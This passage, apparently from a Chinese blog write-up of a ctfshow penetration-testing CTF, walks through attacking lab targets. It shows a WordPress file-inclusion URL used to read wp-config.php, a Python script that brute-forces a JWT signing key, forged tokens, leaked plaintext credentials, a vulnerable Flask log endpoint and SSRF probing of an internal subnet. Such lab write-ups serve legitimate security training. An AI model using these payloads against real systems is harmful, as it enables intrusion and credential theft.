pan></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>    <span class="token string">"/login"</span><span class="token punctuation">,</span>    <span class="token string">"/"</span><span class="token punctuation">,</span>    <span class="token string">"/task_newest"</span><span class="token punctuation">,</span>    <span class="token string">"/task_completed"</span><span class="token punctuation">,</span>    <span class="token string">"/task_cancelled"</span><span class="token punctuation">,</span>    <span class="token string">"/message_inbox"</span><span class="token punctuation">,</span>    <span class="token string">"/message_sent"</span><span class="token punctuation">,</span>    <span class="token string">"/messageBox"</span><span class="token punctuation">,</span>    <span class="token string">"/listTaskFiles"</span><span class="token punctuation">,</span>    <span class="token string">"/readTaskFile"</span><span class="token punctuation">,</span>    <span class="token string">"/downloadTaskFile"</span><span class="token punctuation">,</span>    <span class="token string">"/getPhone"</span><span class="token punctuation">,</span>    <span class="token string">"/getServerInfo"</span><span class="token punctuation">,</span>    <span class="token string">"/checkServer"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后猜测得去前面提到的某动保站实际打点一下了，是个wordpress</p><p>直接wpscan扫一下：</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101173857446.png" alt="image-20250101173857446"></p><p>发现有个文件包含，看下poc：<a href="https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b/">https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b/</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//example.com/?aam-media=wp-config.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载 wp-config.php 得到数据库账密</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101174014694.png" alt="image-20250101174014694"></p><p>flag：<code>ctfshow&#123;hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05&#125;</code></p><hr><h1 id="第二章（Fastapi）"><a href="#第二章（Fastapi）" class="headerlink" title="第二章（Fastapi）"></a>第二章（Fastapi）</h1><h2 id="秘密潜伏"><a href="#秘密潜伏" class="headerlink" title="秘密潜伏"></a>秘密潜伏</h2><p>账密 <code>hsinchug_wp1:Q.4Vyj8VCiedX1KYU5g05</code></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101174252508.png" alt="image-20250101174252508"></p><p>发现key</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101174645000.png" alt="image-20250101174645000"></p><p>key：<code>4a4f7d6e8b5??Dc7f</code></p><p>总之先把之前 fastapi 的每个接口都测一遍：</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101180655730.png" alt="image-20250101180655730"></p><p>以下路由需要高权限</p><pre><code>/listTaskFiles/readTaskFile/downloadTaskFile</code></pre><p>现在准备写脚本爆破 jwt</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> jwt<span class="token keyword">import</span> itertools<span class="token keyword">import</span> requests<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 定义 Payload 数据</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"dylan"</span><span class="token punctuation">,</span>    <span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1735985106</span><span class="token punctuation">&#125;</span><span class="token comment"># 生成所有可能的替换字符</span>possible_chars <span class="token operator">=</span> <span class="token string">"0123456789abcdef"</span>combinations <span class="token operator">=</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>possible_chars<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment"># 遍历所有可能的替换字符组合</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>combinations<span class="token punctuation">)</span><span class="token punctuation">:</span>    chars <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    modified_key <span class="token operator">=</span> <span class="token string">"4a4f7d6e8b5"</span> <span class="token operator">+</span> chars <span class="token operator">+</span> <span class="token string">"0c7f"</span>    <span class="token comment"># print(modified_key)</span>    <span class="token comment"># # 生成 JWT</span>    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token punctuation">(</span>modified_key<span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>    <span class="token comment"># print(token)</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">&#125;</span>    <span class="token comment"># 发送 HTTP 请求</span>    url <span class="token operator">=</span> <span class="token string">'http://94e3c5a5-9608-4bf6-bc9a-519026a4f79c.challenge.ctf.show/'</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>modified_key<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爆出key：<code>4a4f7d6e8b5e3a0c7f</code></p><p>token：<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNTk4NTEwNn0.7lqthRIUXMlHFLv8J25BF2qzoMn6EbXaJHeLLKuy6VI</code></p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTczNjA4NTIwOH0.qCHIJugF1Q4TQexDG_vydZbJhUPz9WWXs4_ikK9pagI</p><p>访问 &#x2F;getPhone 接口拿到 dylan 的电话号码</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103181859746.png" alt="image-20250103181859746"></p><p>flag：<code>ctfshow&#123;117447685307&#125;</code></p><hr><h2 id="收集敌方身份信息"><a href="#收集敌方身份信息" class="headerlink" title="收集敌方身份信息"></a>收集敌方身份信息</h2><p>以 dylan 身份过一遍接口</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103182341919.png" alt="image-20250103182341919"></p><p>那么 dylan 的账密为<code>dylan:8f7a55c6d9a7d9a7</code></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103182223469.png" alt="image-20250103182223469"></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>使用 <code>/listTaskFiles?path</code>遍历目录，发现不能目录穿越，测了一下把 <code>/</code> 和 <code>\</code> ban了，但是<code>..</code>能用</p><p>使用 <code>/readTaskFile?path=&amp;file_name=</code> 读取文件，同样有上面的waf，而且还ban了app.py</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103182732770.png" alt="image-20250103182732770"></p><h3 id="init-users-json"><a href="#init-users-json" class="headerlink" title="init_users.json"></a>init_users.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"hsinchug_wp1"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"hsinchug_wp1"</span><span class="token punctuation">,</span>        <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"Q.4Vyj8VCiedX1KYU5g05"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"dylan"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"dylan"</span><span class="token punctuation">,</span>        <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"8f7a55c6d9a7d9a7"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"secret_user"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"root"</span><span class="token punctuation">,</span>        <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"7y.(sc#Ac_"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;7y.(sc#Ac_&#125;</code></p><h3 id="main-py-bak"><a href="#main-py-bak" class="headerlink" title="main.py.bak"></a>main.py.bak</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> session<span class="token keyword">from</span> flask <span class="token keyword">import</span> url_for<span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token keyword">import</span> logging<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> basename<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> joinapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log server is running'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">check_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/key'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/log_server_key.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'key'</span><span class="token punctuation">:</span> key<span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_log_option'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_log_option</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logName <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logName'</span><span class="token punctuation">)</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    app_log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>logName<span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    clear_log_file<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log option set successfully'</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_log_content'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log content'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">clear_log_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="requirements-txt"><a href="#requirements-txt" class="headerlink" title="requirements.txt"></a>requirements.txt</h3><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">annotated-types==0.6.0anyio==4.3.0bcrypt==4.2.1black==24.10.0blinker==1.8.2certifi==2024.2.2cffi==1.17.1charset-normalizer==3.3.2click==8.1.7colorama==0.4.6cos-python-sdk-v5==1.9.33crcmod==1.7cryptography==44.0.0dnspython==2.6.1docutils==0.21.2email_validator==2.1.1fastapi==0.115.6fastapi-cli==0.0.3Flask==3.0.3greenlet==3.0.3h11==0.14.0httpcore==1.0.5httptools==0.6.1httpx==0.27.0idna==3.6itsdangerous==2.2.0jaraco.classes==3.4.0jaraco.context==6.0.1jaraco.functools==4.1.0Jinja2==3.1.4keyring==25.5.0markdown-it-py==3.0.0MarkupSafe==2.1.5mdurl==0.1.2more-itertools==10.5.0mypy-extensions==1.0.0nh3==0.2.20orjson==3.10.3packaging==24.2passlib==1.7.4pathspec==0.12.1pkginfo==1.12.0platformdirs==4.3.6pycparser==2.22pycryptodome==3.21.0pydantic==2.7.1pydantic_core==2.18.2Pygments==2.18.0PyJWT==2.10.1PyMySQL==1.1.0python-dotenv==1.0.1python-multipart==0.0.9pywin32-ctypes==0.2.3PyYAML==6.0.1readme_renderer==44.0requests==2.31.0requests-toolbelt==1.0.0rfc3986==2.0.0rich==13.7.1secretMessageResponse==2.0.17setuptools==75.6.0shellingham==1.5.4six==1.17.0sniffio==1.3.1SQLAlchemy==2.0.30sqlmodel==0.0.22starlette==0.41.3tencentcloud-sdk-python==3.0.1145twine==6.0.1typer==0.12.3typing_extensions==4.11.0ujson==5.10.0urllib3==2.2.1uvicorn==0.29.0watchfiles==0.21.0websockets==12.0Werkzeug==3.0.3xmltodict==0.14.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103184410216.png" alt="image-20250103184410216"></p><p>这里都是实体类没东西</p><hr><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>在 &#x2F;downloadTaskFile 这里测试前面 &#x2F;getServerInfo 接口获取的 ip c段，测出内网php服务</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103185859314.png" alt="image-20250103185859314"></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"success"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"http://172.2.240.5"</span><span class="token punctuation">,</span><span class="token property">"file_content"</span><span class="token operator">:</span><span class="token string">"\n&lt;!DOCTYPE html lang=\"en\">\n\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    &lt;title>Database TEST&lt;/title>\n\t&lt;script>\n\t\tconst DATABASE_SECRET_KEY = '0x8F7C71E8E82E4D1E';\n\t&lt;/script>\n&lt;/head>\n\n&lt;body>\n    &lt;h1>Welcome to Database TEST&lt;/h1>\n    &lt;p>This is a test page for database connection and queries.&lt;/p>\n    &lt;form action=\"index.php\" method=\"get\">\n        &lt;label for=\"name\">Enter Database username:&lt;/label>\n        &lt;input type=\"text\" id=\"name\" name=\"username\" required>\n        &lt;br>&lt;br>\n        &lt;label for=\"password\">Enter Database password:&lt;/label>\n        &lt;input type=\"password\" id=\"password\" name=\"password\" required>\n        &lt;br>&lt;br>\n        &lt;label for=\"dsn\">Enter Database DSN:&lt;/label>\n        &lt;input type=\"text\" id=\"dsn\" name=\"dsn\" required>\n        &lt;br>&lt;br>\n        &lt;label for=\"query\">Enter TEST Query:&lt;/label>\n        &lt;input type=\"text\" id=\"query\" name=\"query\" required>\n        &lt;br>&lt;br>\n        &lt;input type=\"submit\" value=\"Submit\">\n    &lt;/form>\n&lt;/body>\n\n&lt;html>\n\n\n"</span><span class="token punctuation">,</span><span class="token property">"request_headers"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"User-Agent"</span><span class="token operator">:</span><span class="token string">"python-requests/2.31.0"</span><span class="token punctuation">,</span><span class="token property">"Accept-Encoding"</span><span class="token operator">:</span><span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span><span class="token property">"Accept"</span><span class="token operator">:</span><span class="token string">"*/*"</span><span class="token punctuation">,</span><span class="token property">"Connection"</span><span class="token operator">:</span><span class="token string">"keep-alive"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"response_headers"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"Server"</span><span class="token operator">:</span><span class="token string">"nginx/1.14.2"</span><span class="token punctuation">,</span><span class="token property">"Date"</span><span class="token operator">:</span><span class="token string">"Fri, 03 Jan 2025 10:57:34 GMT"</span><span class="token punctuation">,</span><span class="token property">"Content-Type"</span><span class="token operator">:</span><span class="token string">"text/html; charset=UTF-8"</span><span class="token punctuation">,</span><span class="token property">"Transfer-Encoding"</span><span class="token operator">:</span><span class="token string">"chunked"</span><span class="token punctuation">,</span><span class="token property">"Connection"</span><span class="token operator">:</span><span class="token string">"keep-alive"</span><span class="token punctuation">,</span><span class="token property">"X-Powered-By"</span><span class="token operator">:</span><span class="token string">"PHP/7.2.24"</span><span class="token punctuation">,</span><span class="token property">"Content-Encoding"</span><span class="token operator">:</span><span class="token string">"gzip"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag：<code>ctfshow&#123;0x8F7C71E8E82E4D1E&#125;</code></p><p>还测出前面源码 8888 端口的flask：（ip不一样因为重启了靶机）</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103195415832.png" alt="image-20250103195415832"></p><p>还测出一个 jetty 服务</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250104002347581.png" alt="image-20250104002347581"></p><p>还有一个 172.2.xxx.2:7400 的服务，返回401，估计是控制环境用的</p><hr><h1 id="第三章（PHP）"><a href="#第三章（PHP）" class="headerlink" title="第三章（PHP）"></a>第三章（PHP）</h1><h2 id="跳岛战术"><a href="#跳岛战术" class="headerlink" title="跳岛战术"></a>跳岛战术</h2><p>跳岛战术，指直接跳过这题打后面几道非预期（</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103190127370.png" alt="image-20250103190127370"></p><p>php服务器 172.2.xxx.5</p><p>观察一下前面得到的html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span> <span class="token name">lang=</span><span class="token string">"en"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span 